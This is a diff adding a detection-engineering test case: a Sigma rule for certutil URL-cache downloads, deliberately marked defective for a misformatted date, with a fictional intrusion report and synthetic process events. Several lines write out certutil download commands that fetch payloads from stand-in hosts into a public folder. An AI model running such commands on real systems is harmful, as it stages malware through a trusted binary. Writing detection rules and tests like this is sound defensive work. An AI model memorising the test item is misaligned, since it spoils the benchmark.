@@ -1,0 +1,107 @@
+id: D2-05
+role: defective
+defect_class: D2
+evasive: false
+why: The date is written 02/10/2026 (day/month/year), but the contract requires the format YYYY/MM/DD.
+  All other metadata and the detection logic are valid.
+expected_gate: G2
+report_text: Saltmarsh stage-two retrieval. The operator downloaded the payload with certutil.exe -urlcache
+  -split -f http://stage.saltmarsh.test/p.bin and wrote it to the Public profile directory before running
+  it. The certutil.exe invocation came from an interactive cmd.exe session opened over an RDP connection
+  with stolen credentials. Responders observed the same urlcache and split switches on a second host eleven
+  minutes later, this time pointing at a numeric address in the documentation range rather than a hostname.
+  Certutil is a signed Windows binary, which is why the actor preferred it over a custom downloader, and
+  administrators in this environment normally use it only for certificate and hash tasks.
+evidence:
+- The operator downloaded the payload with certutil.exe -urlcache -split -f http://stage.saltmarsh.test/p.bin
+logsource: windows_process_creation
+techniques:
+- T1105
+sigma_yaml: |
+  title: Certutil URL Cache Download with Split Switch
+  id: a94e3b17-6d2c-4f80-81b5-3c0e7d29a6f4
+  status: experimental
+  description: Detects certutil.exe fetching a remote file with the urlcache and split switches as seen in the Saltmarsh intrusion.
+  references:
+    - urn:atidep:case
+  author: case-author
+  date: 02/10/2026
+  tags:
+    - attack.command_and_control
+    - attack.t1105
+  logsource:
+    category: process_creation
+    product: windows
+  detection:
+    selection:
+      Image|endswith: '\certutil.exe'
+      CommandLine|contains|all:
+        - 'urlcache'
+        - 'split'
+    condition: selection
+  falsepositives:
+    - Administrators downloading certificate revocation data by hand with certutil
+  level: high
+assumptions: []
+events:
+  positive:
+  - kind: process_create
+    image: C:\Windows\System32\certutil.exe
+    cmd: certutil.exe -urlcache -split -f http://stage.saltmarsh.test/p.bin C:\Users\Public\p.bin
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe
+    user: LAB\dave
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\System32\certutil.exe
+    cmd: certutil -urlcache -split -f http://198.51.100.23/a.dll C:\Users\Public\a.dll
+    parent: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+    parent_cmd: powershell.exe
+    user: LAB\dave
+    dest_ip: null
+    dest_port: null
+    name: null
+  negative:
+  - kind: process_create
+    image: C:\Windows\System32\PING.EXE
+    cmd: ping 192.0.2.1
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe
+    user: LAB\erin
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\System32\tasklist.exe
+    cmd: tasklist /v
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe
+    user: LAB\erin
+    dest_ip: null
+    dest_port: null
+    name: null
+  lookalike:
+  - kind: process_create
+    image: C:\Windows\System32\certutil.exe
+    cmd: certutil.exe -hashfile C:\Tools\installer.msi SHA256
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe
+    user: LAB\itadmin
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\System32\certutil.exe
+    cmd: certutil.exe -urlcache * delete
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe
+    user: LAB\itadmin
+    dest_ip: null
+    dest_port: null
+    name: null
+tamper_sigma_yaml: ''
+review: {}
+excluded: false
+exclusion_reason: ''
